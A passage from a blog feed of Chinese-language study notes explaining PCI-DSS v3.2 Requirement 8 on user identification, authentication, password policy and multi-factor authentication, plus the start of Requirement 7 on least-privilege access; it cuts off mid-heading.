    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-八"><a href="#PCI-DSS-V3-2-学习笔记-八" class="headerlink" title="PCI-DSS(V3.2)学习笔记(八)"></a>PCI-DSS(V3.2)学习笔记(八)</h1><hr><h1 id="四、实施强效的访问控制"><a href="#四、实施强效的访问控制" class="headerlink" title="四、实施强效的访问控制"></a>四、实施强效的访问控制</h1><h2 id="要求8：识别并验证对系统组件的访问"><a href="#要求8：识别并验证对系统组件的访问" class="headerlink" title="要求8：识别并验证对系统组件的访问"></a>要求8：识别并验证对系统组件的访问</h2><p>实施强效的访问控制，我们在要求7中已经针对用户对持卡人的访问进行限制了，对于一个强效的访问控制，我们不但要有明确的访问权限控制，同时我们也要确保每一个访问时授权的，是通过我们的验证的，防止有绕过我们访问限制机制来进行访问，所以我们对用户的访问还是要经过识别和验证的。<br>只有通过对访问请求的识别的验证，我们才能通过这个对系统组件的访问或者操作请求。<br>为了达到上面的要求，我们通过为所有有访问权限的角色分配唯一的id标识符，这样能让每个人对自己的操作负责，同时也为后面的通过用户id来识别提供标志。</p><h3 id="8-1-规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理"><a href="#8-1-规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理" class="headerlink" title="8.1 规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理"></a>8.1 规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-6921dfb030e7c6bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1"><br>对于非消费者用户，比如我们公司的员工，对于这些用户，在他们对系统组件进行访问或者操作请求是要有身份识别。对于消费者用户是完全没有权限访问的，所有不在我们前面说的白名单里面，是被默认拒绝所有给拒绝了的。<br>这里可能会有一点歧义，这里的意思是所有的非消费者用户和管理员用户都得必须经过这个用户识别的过程，就是管理员用户也得经过这个审核。</p><h4 id="8-1-1-允许用户访问系统组件或持卡人数据之前，为期分配唯一ID"><a href="#8-1-1-允许用户访问系统组件或持卡人数据之前，为期分配唯一ID" class="headerlink" title="8.1.1 允许用户访问系统组件或持卡人数据之前，为期分配唯一ID"></a>8.1.1 允许用户访问系统组件或持卡人数据之前，为期分配唯一ID</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f6b199b708bec201.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.1"><br>首先就是确保我们的用户在访问系统组件的时候有已经分配好的唯一识别的ID，这样确保在后期审核检查的时候可以根据ID找到对应的员工用户，明确每一个操作的责任。</p><h5 id="8-1-2-控制添加、删除和修改用户ID、凭证和其他标识符对象"><a href="#8-1-2-控制添加、删除和修改用户ID、凭证和其他标识符对象" class="headerlink" title="8.1.2 控制添加、删除和修改用户ID、凭证和其他标识符对象"></a>8.1.2 控制添加、删除和修改用户ID、凭证和其他标识符对象</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-caa7a1d737fd02ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.2"><br>我们前面一个说了根据标识符来明确每一个操作的责任，所以对于这个标识符来说我们要确保他是正确的，没有被恶意删改过得。<br>对于这个标识符的删改我们应该有强有力的控制手段，确保每一个删改都是有效的。攻击者很可能更改标识符ID来隐藏自己的痕迹，使我们更难找到漏洞。</p><h4 id="8-1-3-立即撤销到期用户的访问权"><a href="#8-1-3-立即撤销到期用户的访问权" class="headerlink" title="8.1.3 立即撤销到期用户的访问权"></a>8.1.3 立即撤销到期用户的访问权</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bf5fa2dca2b5379d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.3"><br>对于有期限的用户，或者说离职员工的用户等，我们要在第一时间撤销他们的访问权限。有些时候就会出现，我删除了某个用户，但是他对某些系统组件的访问权限还在，所以我们不仅要确保用户被安全删除并且撤销了用户的所有访问权限。<br>同时残留的员工数据可能不会受到足够安全的保护，这些信息会很容易泄露，若果没有妥善的处理这些账号遗留的权限，会带来不必要的麻烦。</p><h4 id="8-1-4-在90天内删除-禁用非活动的用户账户"><a href="#8-1-4-在90天内删除-禁用非活动的用户账户" class="headerlink" title="8.1.4 在90天内删除/禁用非活动的用户账户"></a>8.1.4 在90天内删除/禁用非活动的用户账户</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c411d7ed57b3e667.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.4"><br>对于非活动用户的清理这在各种论坛网站上是很常见的，比如自己学校的bt站，pt站。定期删除这些不活动的账户也是很有必要的，首先这些可能是被攻击者恶意注册的账号，同时也减轻了我们服务器的压力，为需要的用户更好的提供服务。其次，对于注册条件困难的系统，不活跃的用户，更容易被攻击者攻击，从而获取用户数据或者进行进一步的攻击。</p><h4 id="8-1-5-通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID"><a href="#8-1-5-通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID" class="headerlink" title="8.1.5 通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID"></a>8.1.5 通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d5cd1b6459842f3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.5"><br> 1、仅在需要的时间段启用并在不用时禁用<br> 2、使用时进行监控<br>因为一些业务或者其他的需要，我们经常会让第三方来访问我们的系统组件，我们可能会为他们分配指定的远程账户，或者公开，这样就增加了攻击者进入我们网络进行攻击行为的可能性。<br>比如我们在使用某个组件，需要服务商定期进行检测，这个时候就会对他们开放某个链接进行访问，如果攻击者发现这个链接，很有可能就利用这个进行攻击。<br>所以我们对于对第三方的访问，我们需要定时开放，需要的时候允许访问，不需要的时候则要禁止其的访问，其次在第三方访问的时候我们也要进行监控，及时发现攻击者的恶意访问。</p><h4 id="8-1-6-在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试"><a href="#8-1-6-在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试" class="headerlink" title="8.1.6 在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试"></a>8.1.6 在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cec85de3d91de47e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.6"><br>嗯，确实很需要，但是对于错误次数要有一定的控制，因为这里我们是需要牺牲一部分的用户体验来换取更安全的环境。<br>但是这部分牺牲我觉得是十分值得的，对于密码的爆破现在已经被无数黑产做成了易建华攻击工具，网络上数不胜数。所以对于密码错误而锁定ID的要求是很有必要的，但是也有很多厂商更改成其他的比如错误一定次数后限制时间尝试，并且限制的时间依次上升，就比如iphone，这也是一样的效果，抵御了密码的爆破。</p><h4 id="8-1-7-将锁定时间设为最少30分钟或直到管理员启用用户ID"><a href="#8-1-7-将锁定时间设为最少30分钟或直到管理员启用用户ID" class="headerlink" title="8.1.7 将锁定时间设为最少30分钟或直到管理员启用用户ID"></a>8.1.7 将锁定时间设为最少30分钟或直到管理员启用用户ID</h4><p>好吧，这里所说的锁定用户和我上面说的是一个意思。我们可以根据系统的重要程度来确定锁定时间，如果是及其重要的系统，可以直接锁定，知道管理员启用用户ID。<br>但是到这里大家就会发现，这里面其实也是有漏洞的，记得之前有一个网上竞拍的例子，用户B为了以最低价格购买商品，在竞拍快结束时，恶意登录用户A的账户，直至被锁定，然后以较低价格购买商品。<br>在这里我们会发现，我们使用的安全策略有可能影响用户体验，甚至出现BUG，被人恶意利用获利。<br>所以每一项安全策略都不是完美的，牺牲某些东西来换取系统的安全。</p><h4 id="8-1-8-如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话"><a href="#8-1-8-如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话" class="headerlink" title="8.1.8 如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话"></a>8.1.8 如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a908378b58d41701.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.8"><br>如果用户在离开设备后没有安全退出系统，攻击者很有可能窃用了用户的身份，导致信息的泄露。所以对于一定时间未进行任何操作的用户我们需要对其进行注销，比如设置无动作不能超过15分钟。</p><h3 id="8-2-处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理"><a href="#8-2-处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理" class="headerlink" title="8.2 处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理"></a>8.2 处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-11dc522932b1fe2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2"><br>1、所知，如密码或口令<br>2、所有，如令牌设备或智能卡等<br>3、个人特征，如生物特征<br>我们除了分配唯一的标识符之外还得用其他的方法来验证用户身份，这里提到三个方法，基本业内使用的也都是这三种方法。首先是，口令或密码，我觉得这是远远不够的，所以可能还需要其他的方法，物理设备，令牌或者智能卡。以及第三种，个人特征，比如指纹或者虹膜等。<br>唯一的ID识别很容易被窃取，所以我们还需要其他的方法来验证用户身份。</p><h4 id="8-2-1-使用强效加密法使所有验证凭证（例如密码-口令）在所有系统组件中传输和存储时均不可读"><a href="#8-2-1-使用强效加密法使所有验证凭证（例如密码-口令）在所有系统组件中传输和存储时均不可读" class="headerlink" title="8.2.1 使用强效加密法使所有验证凭证（例如密码/口令）在所有系统组件中传输和存储时均不可读"></a>8.2.1 使用强效加密法使所有验证凭证（例如密码/口令）在所有系统组件中传输和存储时均不可读</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c28e3530fdbcb51a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.1"><br>对于我们前面使用的验证凭证，我们需要确保其安全的存储，不会被删改，就和前面的ID标识符一样。我们使用强效的加密手段，确保这些验证凭证在传输和存储的时候都不可读，不会泄露。如果未被加密，很有可能就会被攻击者嗅探获取，盗用身份。</p><h4 id="8-2-2-在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份"><a href="#8-2-2-在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份" class="headerlink" title="8.2.2 在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份"></a>8.2.2 在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9626eb6da424bba0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.2"><br>就是我们在修改用户的身份验证凭证的时候，我们要确保是我在修改我的密码，而不是别人在修改我的密码。这里系统需要确认的是提交修改人的身份，我们就通过之前的验证凭证来验证用户的身份。<br>这里第一次提到了社交工程蓄，就说说吧。就算我们安全措施做的很多，攻击者的手段层出不穷，道高一尺，魔高一丈。<br>一个叫“社交工程学”的攻击手段在国内外十分的流行，让我来形容“社工”，就是四个字，坑蒙拐骗。通过各种渠道，骗取你的密码，已经不是对一个系统来寻找漏洞，而是对一个人来寻找漏洞。钓鱼邮件就是典型的社工的一种，对于不同性格的人使用不同的钓鱼邮件链接，记得英国有一个著名的黑客攻击事件，就是利用领养猫的钓鱼邮件获取密码的。</p><h4 id="8-2-3-密码-口令必须符合以下要求："><a href="#8-2-3-密码-口令必须符合以下要求：" class="headerlink" title="8.2.3 密码/口令必须符合以下要求："></a>8.2.3 密码/口令必须符合以下要求：</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-678f2d7286a0ce55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.3"><br>1、要求长度至少为7个字符<br>2、同时包含数字和字母字符<br>或者，密码/口令必须具有至少与上面指定参数相当的复杂度和强度<br>密码强度也是一个很愁人的问题，毕竟现在密码负担也是一个大难题。我们对于密码强度的要求，必须在一个合适的范围内，密码强度要求低了密码很容易会被攻击者猜到，密码强度高了同样不行，有的人就会很奇怪，密码强度难道不是越高越好吗，很多调查显示不是这样的。<br>比如我们现在要求密码10位以上要有字母，数字，特殊符号，这就会有很多姓名拼音+生日+符号的组合，或者类似于qwer1234！@#￥这样的有规律的密码出现。所以合适的密码强度也很重要。<br>同时不要使用默认密码！！！进过很多公司，在注册时还会显示默认密码123456，很奇葩，怕攻击者找不到方法。还有在变更密码强度策略时，比如之前没有密码强度校验，现在增加密码强度校验，必须对已经注册的没有达到标准的用户先提示，在强制性的更改成达到标准的密码。<br>对于这个密码强度，行业内也有标准，比如： NIST SP 800-63。</p><h4 id="8-2-4-至少每90天变更一次用户密码-口令"><a href="#8-2-4-至少每90天变更一次用户密码-口令" class="headerlink" title="8.2.4 至少每90天变更一次用户密码/口令"></a>8.2.4 至少每90天变更一次用户密码/口令</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-36d5fb9a6dbfc85c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.4"><br>医生也推荐我们每3个月换一次牙刷，因为一个牙刷用久了，很多这个牙刷清理不到的地方会有很多残留的污渍。因为我们的牙刷不是完美的。我们的密码也是一样的，我们的密码不可能是别人永远无法猜到的，所以我们需要定时的更新密码。但是当有严重的泄露风险时要及时更换。</p><h4 id="8-2-5-不允许个人提交与最近使用的4个密码-口令中任何一个相同的新密码-口令"><a href="#8-2-5-不允许个人提交与最近使用的4个密码-口令中任何一个相同的新密码-口令" class="headerlink" title="8.2.5 不允许个人提交与最近使用的4个密码/口令中任何一个相同的新密码/口令"></a>8.2.5 不允许个人提交与最近使用的4个密码/口令中任何一个相同的新密码/口令</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a3ca12a9f25a0182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.5-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-d7bf20db45f120fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.5-2"><br>的确有为了自己方便的用户，为了应对服务商的3个月变更密码的要求就只有两个密码，轮着换，虽然方便，但是很不安全。所有我们也不能允许新密码与之前四次的密码相同，至于为什么是四次，这个应该就是大数据调查吧，低了容易泄露，高了容易让用户每次设置有规律的密码。</p><h4 id="8-2-6-将每个用户首次使用的密码-口令和重置密码-口令设为唯一值，并在首次使用后立即变更"><a href="#8-2-6-将每个用户首次使用的密码-口令和重置密码-口令设为唯一值，并在首次使用后立即变更" class="headerlink" title="8.2.6 将每个用户首次使用的密码/口令和重置密码/口令设为唯一值，并在首次使用后立即变更"></a>8.2.6 将每个用户首次使用的密码/口令和重置密码/口令设为唯一值，并在首次使用后立即变更</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d52f0322ab1e7ba5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.6"><br>就是确保用户注册时的第一个密码的唯一，不能和其他用户重复，如果每个新用户比如IBM公司的员工都用IBM2018.这样的密码，那就很容易被发现。这个在公司内部很多都是很常见的。因为个人的密码负担，很多人会将密码和所属系统联系在一些，比如公司名等。所有密码的唯一性也很重要。</p><h3 id="8-3-使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问"><a href="#8-3-使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问" class="headerlink" title="8.3 使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问"></a>8.3 使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-56c9d37c6a644fcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3"><br>对与持卡人数据环境的远程访问，或者非控制台访问，我们要使用多因素验证。这里的多因素就是说的前面的三种验证手段中的两种或两种以上，不包括一种方法使用两次，那样安全性的提升并不是很大。</p><h3 id="8-3-1-将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE"><a href="#8-3-1-将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE" class="headerlink" title="8.3.1 将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE"></a>8.3.1 将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-72a263462a7c684f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3.1"><br>这是针对所有有权限访问持卡人数据环境的工作人员。<br>这里按照指南可以看到如果持卡人数据环境和其他网络环境没有隔离，那就在具有访问权的工作人员进入这个网络的时候要执行多因素认证。<br>如果持卡人数据环境和其他网络分离了，那就在拥有访问权限的工作人员从其他网络环境进入持卡人数据环境的时候进行多因素验证。</p><h3 id="8-3-2-针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证"><a href="#8-3-2-针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证" class="headerlink" title="8.3.2 针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证"></a>8.3.2 针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-e7ff72a8fad72118.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3.2"><br>对于来自外部互联网的对公司内部网络的所有远程访问都要用多因素认证。<br>多因素认证在外网远程访问公司内网的情况下，主要是针对员工用户和管理员或者因其他需求导致的第三方访问。</p><h3 id="8-4-为所有用户编写并传达验证政策和程序"><a href="#8-4-为所有用户编写并传达验证政策和程序" class="headerlink" title="8.4 为所有用户编写并传达验证政策和程序"></a>8.4 为所有用户编写并传达验证政策和程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-6fe848d535c2da9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.4"><br>包括：<br>1、选择强效验证凭证的指南<br>2、关于用户应如何保护其验证凭证的指南<br>3、关于不重用之前用过的密码的说明<br>4、在怀疑密码可能受到威胁的情况下更改密码的相关说明<br>这个相当于对前面要求的一个总结，对于前面的这些要求，很多是针对用户来说的，我们要有相应的方法，指导用户按着我们的要求执行，所有我们要有相关的指南。<br>比如选择强效验证凭证的指南，告诉用户密码强度的要求，以及不要使用有规律的密码等。<br>向所有的用户传达这些要求和指南他们保证他们了解并遵守。</p><h3 id="8-5-不要使用群组、共享或常规的ID、密码或其他验证方法"><a href="#8-5-不要使用群组、共享或常规的ID、密码或其他验证方法" class="headerlink" title="8.5 不要使用群组、共享或常规的ID、密码或其他验证方法"></a>8.5 不要使用群组、共享或常规的ID、密码或其他验证方法</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c8f6f1846e24a132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.5"><br>具体如下：<br>1、常规用户ID已禁用或删除<br>2、用于系统管理和其他重要功能的共享用户ID不存在<br>3、不使用共享和常规用户ID管理任何系统组件<br>之前已经说过ID标识符是对应个人的，不能一个ID对应多个人员，这样无法追究到具体操作到具体人员。以及删除那些不必要的常规ID或者共享ID等多余功能。</p><h4 id="8-5-1-可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码-口令）（仅针对服务商的额外要求）"><a href="#8-5-1-可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码-口令）（仅针对服务商的额外要求）" class="headerlink" title="8.5.1 可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码/口令）（仅针对服务商的额外要求）"></a>8.5.1 可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码/口令）（仅针对服务商的额外要求）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c3548ea5ffc46d08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.5.1"><br>服务商要确保为每一个客户提供唯一的不同的验证凭证。多个客户使用同一个验证凭证，对于每个客户来说都是很危险的。</p><h3 id="8-6-在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法："><a href="#8-6-在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法：" class="headerlink" title="8.6 在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法："></a>8.6 在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法：</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1896cb33d059fabc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.6-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1de791f3520f820.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.6-2"><br>1、验证机制必须分配到单个账户，不得在多个账户之间共享<br>2、必须要有物理和/或逻辑控制，以确保仅既定账户可使用该机制获得访问权限<br>对于前面说的验证机制的除了第一个密码的其他两个，令牌设备或智能卡和个人特征，我们也要有和ID一样，每一个验证数据仅对应一个账号，不能多人共享！<br>通过物理或逻辑控制（比如指纹，虹膜）我们可以防止非授权用户通过共享的方法或的访问权。因为这些是可以唯一识别用户的。</p><h3 id="8-7-已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）"><a href="#8-7-已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）" class="headerlink" title="8.7 已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）"></a>8.7 已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b1bf2f95e07827ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.8"><br>1、用户对数据库的所有访问、查询和操作均通过编程方法完成<br>2、仅数据库管理员能直接访问或查询数据库<br>3、数据库应用程序的应用程序ID仅可由这些应用程序使用（个人用户或其他非应用程序流程不能使用）<br>针对持卡人数据所在数据库来说，我们对每一个用户对这个数据库的访问都必须进行验证。同时验证完身份之后我们要保证所有的数据库操作都是通过存储代码或程序执行的，而不是用户自己执行的，不是用户访问数据库执行的。<br>权限方面，只有数据库的管理员可以直接访问和查询数据库。且对于那些访问了数据库的应用程序我们确认这个应用程序的ID仅仅可他自己使用，不会被其他流程或个人调用。<br>感觉这一条包含的信息还是很多的，但是经验不足，体会不出里面的精髓。之后会补上。</p><h3 id="8-8-确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序"><a href="#8-8-确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序" class="headerlink" title="8.8 确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序"></a>8.8 确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cd09c4e84da75b2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.8"><br>对于用于身份识别和验证的安全政策与操作程序我们按照要求指定了相应的政策，我们要有详细的记录，并确保相关人员以及进行学习并严格遵守。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实施强效的访问控制，识别并验证对系统组件的访问。要求8的这些都是围绕对系统组件访问的识别和验证。识别和验证就会涉及到验证数据，所以里面也说到了密码策略，以及三个眼政方案。<br>很全面的，唯一想说的是密码策略中的安全策略很多都是牺牲了其他的来换取安全，可能我们牺牲了用户体验，或者工作人员的便利但是换取的安全是十分值得的。但是在公司制定安全策略的时候还是得因地制宜，根据不同的需求制定不同的策略。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-八&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(七)</title>
    <link href="https://rliyuqing.github.io/2018/06/05/20.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/"/>
    <id>https://rliyuqing.github.io/2018/06/05/20. PCI-DSS(V3.2.1)学习笔记(七)/</id>
    <published>2018-06-05T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.798Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-七"><a href="#PCI-DSS-V3-2-学习笔记-七" class="headerlink" title="PCI-DSS(V3.2)学习笔记(七)"></a>PCI-DSS(V3.2)学习笔记(七)</h1><hr><h1 id="四、实施强效的访问控制"><a href="#四、实施强效的访问控制" class="headerlink" title="四、实施强效的访问控制"></a>四、实施强效的访问控制</h1><p>PCI DSS的第四个区域就是实施强效的访问控制，这里的访问控制不仅仅是前面提到的针对某个系统的访问控制，而是针对持卡人数据环境的所有访问来说的；不仅仅是某些具体的业务，应用程序，还有系统组件以及物理的访问等等统统要在我们的访问控制的措施保护之内。</p><h2 id="要求7-：按业务知情需要限制持卡人数据的访问"><a href="#要求7-：按业务知情需要限制持卡人数据的访问" class="headerlink" title="要求7 ：按业务知情需要限制持卡人数据的访问"></a>要求7 ：按业务知情需要限制持卡人数据的访问</h2><p>按业务的知情需要，知情需要，我的理解就是能保证工作人员正常执行工作职责的最小权限。也正好就是我们上面提到的最小权限原则，只授予用户必要的权限，不要过度授权，这样也减少系统、网络、应用、数据库出错的机会。</p><h3 id="7-1-仅有工作人员需要的个人才能访问系统组件和持卡人数据"><a href="#7-1-仅有工作人员需要的个人才能访问系统组件和持卡人数据" class="headerlink" title="7.1 仅有工作人员需要的个人才能访问系统组件和持卡人数据"></a>7.1 仅有工作人员需要的个人才能访问系统组件和持卡人数据</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bc86ab515c17ec7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1"><br>首先我们要减少对持卡人数据的访问，只有那些有工作需要并且有明确授权的用户才能访问持卡人数据所在的环境的系统组件或者持卡人数据。<br>对于我们怎么才能控制因为工作需要且有明确授权的用户访问呢，我们需要有一定的访问控制流程来实现，至少满足下面的这些要求（7.1.1+7.1.4）</p><h4 id="7-1-1-为每个角色定义访问需要"><a href="#7-1-1-为每个角色定义访问需要" class="headerlink" title="7.1.1 为每个角色定义访问需要"></a>7.1.1 为每个角色定义访问需要</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-76c1881aa088b2cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.1"><br>包括：<br>1、每个角色依据工作职能需要访问的系统组件和数据资源<br>2、访问资源所需的全线级别（例如，用户、管理员等）<br>我们之前已经用到了用户和用户组的管理方法来进行网络组建的管理，罪域每个用户，每个角色我们根据每个角色的需求来确定他是否对一个系统组件或者数据有访问权限。<br>比如我们一个测试人员，他应该只对测试环境的数据和组件有访问权限，对线上的数据没有访问需求，也就不分配访问权限。<br>我们要根据每一个角色工作和业务需要授予他必要的权限，在确保最先权限的原则的同时我们要保证授予的权限足够角色进行正常的工作。</p><h5 id="7-1-2-将特权用户ID的访问权限限制为指定工作职责所需的最小权限"><a href="#7-1-2-将特权用户ID的访问权限限制为指定工作职责所需的最小权限" class="headerlink" title="7.1.2 将特权用户ID的访问权限限制为指定工作职责所需的最小权限"></a>7.1.2 将特权用户ID的访问权限限制为指定工作职责所需的最小权限</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-fcbd367bca16a103.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.2-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-bc07a84a0e48a3ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.2-2"><br>特权用户ID就是指的某些应用程序或者服务的特权用户，比如数据库的管理员，备份管理员。在默认情况下这些应用程序或者服务的特权用户可能会拥有超出他所需要执行工作之外的权限；所有我们要对这些特权用户进行授权管理，确保分配给他们的权限也符合最小权限原则。</p><h4 id="7-1-3-基于个人的工作分类和职能分配访问权限"><a href="#7-1-3-基于个人的工作分类和职能分配访问权限" class="headerlink" title="7.1.3 